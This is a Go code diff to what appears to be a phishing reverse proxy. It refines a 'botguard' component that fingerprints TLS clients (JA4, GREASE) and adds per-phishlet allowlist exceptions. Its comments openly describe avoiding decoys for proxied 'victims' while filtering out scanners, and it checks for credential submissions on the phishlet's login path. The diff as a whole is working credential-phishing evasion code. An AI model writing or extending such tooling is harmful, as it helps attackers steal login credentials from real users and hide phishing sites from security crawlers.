@@ -119,6 +119,20 @@ func (p *HttpProxy) SetBotguardUAFilter(on bool) {
 	p.bg_no_ua = !on
 }
 
+// ja4PrefixMatch reports whether the JA4 fingerprint matches any prefix in the
+// list (shared by the node-level -bg-ja4 allowlist and per-phishlet exceptions).
+func ja4PrefixMatch(ja4 string, prefixes []string) bool {
+	if len(prefixes) == 0 {
+		return false
+	}
+	for _, prefix := range prefixes {
+		if strings.HasPrefix(ja4, prefix) {
+			return true
+		}
+	}
+	return false
+}
+
 func (p *HttpProxy) SetBotguardJA4(prefixes string) {
 	for _, s := range strings.Split(prefixes, ",") {
 		s = strings.TrimSpace(s)
@@ -317,6 +331,9 @@ func (p *HttpProxy) isBotRequest(req *http.Request, ps *ProxySession) bool {
 	if !p.cfg.IsActiveHostname(host) {
 		return false
 	}
+	// resolve the phishlet once — used by the per-phishlet JA4 exception and
+	// the v2 credential-path check below
+	pl := p.getPhishletByPhishHost(req.Host)
 	// trusted reverse-proxy edges (e.g. InfraGuard on loopback) — real-client
 	// filtering already happened there; the proxy's own TLS fingerprint
 	// (Python httpx, no GREASE) would otherwise decoy every victim
@@ -361,20 +378,16 @@ func (p *HttpProxy) isBotRequest(req *http.Request, ps *ProxySession) bool {
 			// real users) skips ALL TLS-derived penalties. Without this the
 			// no-GREASE +60 alone would decoy every proxied victim even when the
 			// prefix is allowlisted.
-			ja4Allowed := false
-			if len(p.bg_ja4) > 0 {
-				for _, prefix := range p.bg_ja4 {
-					if strings.HasPrefix(fp.ja4, prefix) {
-						ja4Allowed = true
-						break
-					}
-				}
+			ja4Allowed := ja4PrefixMatch(fp.ja4, p.bg_ja4)
+			if !ja4Allowed && pl != nil && pl.IsJA4Allowed(fp.ja4) {
+				ja4Allowed = true
+				log.Info("botguard: JA4 allowed by phishlet exception (%s, %s) %s", pl.Name, req.RemoteAddr, fp.ja4)
 			}
 			if !ja4Allowed {
 				if !fp.grease {
 					score += 60
 				}
-				if len(p.bg_ja4) > 0 {
+				if len(p.bg_ja4) > 0 || (pl != nil && len(pl.BgJA4Allow()) > 0) {
 					score += 50
 					log.Warning("botguard: JA4 not in allowlist (%s) %s", req.RemoteAddr, fp.ja4)
 				}
@@ -398,7 +411,6 @@ func (p *HttpProxy) isBotRequest(req *http.Request, ps *ProxySession) bool {
 		graceOver := time.Since(st.firstSeen) > time.Duration(p.bg_grace)*time.Second
 		p.bg_mtx.Unlock()
 		if graceOver && !st.verified {
-			pl := p.getPhishletByPhishHost(req.Host)
 			isCred := req.Method == "POST"
 			if pl != nil && strings.EqualFold(req.URL.Path, pl.login.path) {
 				isCred = true
